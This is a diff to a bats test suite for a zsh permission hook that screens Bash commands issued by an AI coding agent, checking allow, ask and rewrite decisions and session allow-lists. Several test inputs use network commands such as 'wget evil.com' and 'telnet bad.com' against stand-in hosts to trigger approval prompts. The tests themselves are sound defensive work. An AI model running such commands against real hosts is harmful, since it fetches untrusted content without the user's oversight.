@@ -3,7 +3,6 @@ bats_load_library 'helper'
 setup() {
   bats_tmp_dir
   SCRIPT="$BATS_TEST_DIRNAME/../preToolUse-Bash"
-  export CLAUDE_HOOKS_LOG_DIR="$BATS_TMP_DIR"
   # Sandbox session dir so approval state stays isolated per test
   export CLAUDE_SESSIONS_DIR="$BATS_TMP_DIR"
 }
@@ -15,6 +14,25 @@ setup() {
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'allow'
   expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
+}
+
+@test "integration: keeps the other tool input keys when allowing" {
+  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"rm -f a","description":"Remove a","timeout":5000,"run_in_background":true}}'
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'allow'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'rm-guarded -f a'
+  expect_json '.hookSpecificOutput.updatedInput.description' 'Remove a'
+  expect_json '.hookSpecificOutput.updatedInput.timeout' '5000'
+  expect_json '.hookSpecificOutput.updatedInput.run_in_background' 'true'
+}
+
+@test "integration: keeps the other tool input keys when asking" {
+  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com","description":"Fetch","timeout":5000}}'
+  [[ "$status" -eq 0 ]]
+  expect_json '.hookSpecificOutput.permissionDecision' 'ask'
+  expect_json '.hookSpecificOutput.updatedInput.command' 'wget evil.com'
+  expect_json '.hookSpecificOutput.updatedInput.description' 'Fetch'
+  expect_json '.hookSpecificOutput.updatedInput.timeout' '5000'
 }
 
 @test "integration: passes grep count through unchanged" {
@@ -95,7 +113,7 @@ setup() {
 }
 
 @test "integration: a binary in the session allow-list is auto-approved" {
-  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
+  bats_run_zsh "CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
@@ -103,7 +121,7 @@ setup() {
 }
 
 @test "integration: reason only mentions binaries missing from the session allow-list" {
-  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
+  bats_run_zsh "CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; sessionAllowListAdd --command wget"
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com && telnet bad.com"}}'
   [[ "$status" -eq 0 ]]
@@ -168,19 +186,6 @@ setup() {
   bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [[ "$status" -eq 0 ]]
   expect_json_null '.hookSpecificOutput.systemMessage'
-}
-
-@test "hook logs to CLAUDE_HOOKS_LOG_DIR" {
-  solkanEvaluate() {
-    SOLKAN_VERDICT=allow
-    SOLKAN_COMMAND="$1"
-    SOLKAN_REJECTED=()
-  }
-  bats_mock solkanEvaluate
-
-  bats_run_zsh "$SCRIPT" <<<'{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
-  [[ "$status" -eq 0 ]]
-  [[ -f "$BATS_TMP_DIR/last-bash-input.json" ]]
 }
 
 @test "preserves \xa0 as literal chars through full hook pipeline" {
@@ -263,7 +268,7 @@ setup() {
   [[ "$status" -eq 0 ]]
   expect_json '.hookSpecificOutput.permissionDecision' 'ask'
 
-  bats_run_zsh "CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; approvalPendingGet --tool-use-id toolu_01"
+  bats_run_zsh "CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'; approvalRequestGet --tool-use-id toolu_01"
   [[ "$output" = $'wget\ncurl' ]]
 }
 
@@ -276,7 +281,7 @@ setup() {
   }
   bats_mock solkanEvaluate
 
-  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
+  local sourcePrefix="CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command wget"
 
   bats_run_zsh "$SCRIPT" <<<'{"session_id":"test","tool_use_id":"toolu_01","tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
@@ -293,7 +298,7 @@ setup() {
   }
   bats_mock solkanEvaluate
 
-  local sourcePrefix="CLAUDE_SESSION_ID=test; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
+  local sourcePrefix="CLAUDE_SESSION_ID=test; CLAUDE_SESSION_DIR=\"\$CLAUDE_SESSIONS_DIR/test\"; source '$BATS_TEST_DIRNAME/../lib/approval-memory.zsh'"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
   bats_run_zsh "${sourcePrefix}; approvalCountIncrement --command /usr/bin/grep"
 
@@ -411,9 +416,9 @@ setup() {
   expect_json '.hookSpecificOutput.updatedInput.command' 'echo hello'
 }
 
-@test "passes the cwd of the input JSON to solkanEvaluate" {
+@test "sets CLAUDE_CWD from the cwd of the input JSON before solkanEvaluate" {
   solkanEvaluate() {
-    print -r -- "$2" > "$BATS_TMP_DIR/solkan-cwd.txt"
+    print -r -- "$CLAUDE_CWD" > "$BATS_TMP_DIR/solkan-cwd.txt"
     SOLKAN_VERDICT=allow
     SOLKAN_COMMAND="$1"
     SOLKAN_REJECTED=()
